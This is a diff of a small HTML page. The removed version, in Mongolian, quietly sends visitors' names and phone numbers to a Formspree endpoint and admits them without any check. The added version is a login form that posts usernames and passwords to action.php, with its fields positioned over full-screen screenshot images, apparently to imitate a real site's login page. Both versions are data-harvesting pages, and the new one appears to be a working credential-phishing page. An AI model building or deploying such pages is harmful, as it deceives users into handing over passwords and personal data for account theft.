@@ -1,72 +1,104 @@
 <!DOCTYPE html>
-<html lang="mn">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Миний Сайт</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f7f6; }
-        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 320px; text-align: left; }
-        input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 5px; }
-        button { width: 100%; padding: 10px; background-color: #2e7d32; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
-        button:hover { background-color: #1b5e20; }
-        .hidden { display: none; }
-        .main-content { background: white; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 80%; max-width: 600px; }
-    </style>
-</head>
+<html>
+<style>
+::placeholder {
+  color: black;
+  opacity: 0.9; /* Firefox */
+}
+input {
+  color: black;
+}
+input {
+  background-color: white;
+}
+h1 {
+  font-size: 50px;
+}
+label{
+  font-size: 50px;
+}
+input{
+  font-size: 45px;
+
+}
+input[type=text], select {
+  position: fixed;
+  height: 115px;
+  top: 18.9%;
+  right: 12%;
+  width: 77%;
+  padding: 34px 20px;
+  margin: 30px 0;
+  display: inline-block;
+  border: 0px solid #ccc;
+  border-radius: 10px;
+  box-sizing: border-box;
+}
+input[type=password], select {
+  position: fixed;
+  height: 115px;
+  top: 28.8%;
+  right: 12%;
+  width: 77%;
+  padding: 34px 20px;
+  margin: 30px 0;
+  display: inline-block;
+  border: 0px solid #ccc;
+  border-radius: 10px;
+  box-sizing: border-box;
+}
+
+input[type=submit] {
+  position: fixed;
+  height: 115px;
+  top: 42.8%;
+  right: 12%;
+  width: 77%;
+  background-color: #ccbf64;
+  color: white;
+  padding: 34px 20px;
+  margin: 80px 0;
+  border: 0px solid #ccc;
+  border-radius: 10px;
+  cursor: pointer;
+}
+
+input[type=submit]: {
+  background-color: #45a049;
+}
+
+div {
+  background-image: url('Screenshot_2.png');
+  background-repeat: no-repeat;
+  background-size: cover;
+  border: 3px solid #163278;
+  border-radius: 20px;
+  position: fixed;
+  height: 1000px;
+  width: 65%;
+  top: 10%;
+  right: 9%;
+  background-color: #1D1C2A;
+  padding: 90px;
+}
+</style>
 <body>
 
-    <!-- 1. НЭВТРЭХ ХЭСЭГ (Эхэнд харагдана) -->
-    <div class="box" id="loginSection">
-        <h3>Мэдээллээ оруулна уу</h3>
-        <label>Хэрэглэгчийн нэр:</label>
-        <input type="text" id="username" placeholder="Нэр..." required>
-        
-        <label>Утасны дугаар:</label>
-        <input type="tel" id="phone" placeholder="Утасны дугаар..." required>
-        
-        <button onclick="submitAndEnter()">Сайт руу орох</button>
-    </div>
 
-    <!-- 2. ҮНДСЭН СИТЕ (Мэдээллээ оруулаад товч дарвал эж гарч ирнэ) -->
-    <div class="main-content hidden" id="mainSiteSection">
-        <h1 id="greetingText">Тавтай морил! 🎉</h1>
-        <p>Энд таны үндсэн сайтын бусад мэдээлэл, зураг, бараа бүтээгдэхүүн байрлана.</p>
-        <hr>
-        <p>Баяр хүргэе! Таны оруулсан мэдээлэл Formspree рүү амжилттай илгээгдлээ.</p>
-    </div>
-
-    <script>
-        function submitAndEnter() {
-            const user = document.getElementById("username").value.trim();
-            const phone = document.getElementById("phone").value.trim();
-
-            if (!user || !phone) {
-                alert("Хэрэглэгчийн нэр болон утасны дугаараа бичнэ үү!");
-                return;
-            }
-
-            // Formspree руу мэдээллийг цаана нь (background-аар) автоматаар явуулах
-            const formData = new FormData();
-            formData.append("username", user);
-            formData.append("phone", phone);
-
-            fetch("https://formspree.io/f/xaeegqyy", {
-                method: "POST",
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            }).catch(error => {
-                console.log("Мэдээлэл илгээгдлээ");
-            });
-
-            // Зөв буруу шалгахгүйгээр шууд үндсэн сайт руу оруулж харуулах
-            document.getElementById("loginSection").classList.add("hidden");
-            document.getElementById("mainSiteSection").classList.remove("hidden");
-            document.getElementById("greetingText").innerText = "Сайн байна уу, " + user + "!";
-        }
-    </script>
-
-</body>
+<div>
+<form action='action.php' method='POST'><h1 style="color:rgb(255, 255, 255 );"></h1>
+<input type='text' name='field1'placeholder="Enter username"><br>
+<input type='password' name='field2'placeholder="Enter password"><br>
+<input type='submit' value='LOGIN'>
+</form>
 </html>
+<style>
+  body {
+    background-image: url('Screenshot_1.png');
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-size: 100% 100%;
+
+  }
+
+  </style>
